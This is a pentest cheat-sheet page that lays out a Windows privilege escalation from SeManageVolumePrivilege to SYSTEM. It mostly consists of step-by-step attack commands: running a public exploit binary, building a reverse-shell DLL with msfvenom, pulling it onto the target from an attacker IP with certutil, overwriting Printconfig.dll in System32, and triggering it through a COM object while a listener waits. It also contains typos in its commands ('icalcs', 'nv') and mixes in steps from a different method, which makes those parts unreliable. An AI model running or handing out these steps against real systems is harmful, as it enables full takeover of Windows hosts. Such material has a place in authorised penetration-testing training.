---
description: >-
  Get full control over C:\ when the user has SeManageVolumePrivilege (allowing
  to read/write any files).
---

# SeManageVolumePrivilege

### Local Enumeration

```bash
CMD> whoami /priv 
```



<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

### Exploiting SeManageVolumePrivilege

#### 1. Download the exploit - [https://github.com/CsEnox/SeManageVolumeExploit/releases](https://github.com/CsEnox/SeManageVolumeExploit/releases)

#### 2. Printconfig.dll to trigger the exploit to gain SYSTEM privilege - [https://github.com/sailay1996/awesome\_windows\_logical\_bugs/blob/master/FileWrite2system.txt](https://github.com/sailay1996/awesome_windows_logical_bugs/blob/master/FileWrite2system.txt)

#### 3. Execution&#x20;

{% code overflow="wrap" %}
```bash
# Run SeManageVolumeExploit 
CMD> SeManageVolumeExploit.exe
CMD> icalcs C:\Windows          # Check you have a (F) under Windows directory

# Copy phoneinfo.dll to *C:\Windows\System32*
# Place Report.wer file and WerTrigger.exe in a same directory.
# Run WerTrigger.exe.

# Kali
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=xx LPORT=1234 -f dll -o Printconfig.dll

# Target 
certutil -urlcache -split -f http://192.168.45.183/Printconfig.dll 
copy Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll 

# Kali
nv -nlvp 1234

# Target
PS> $type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}") 
PS> $object = [Activator]::CreateInstance($type)  
```
{% endcode %}
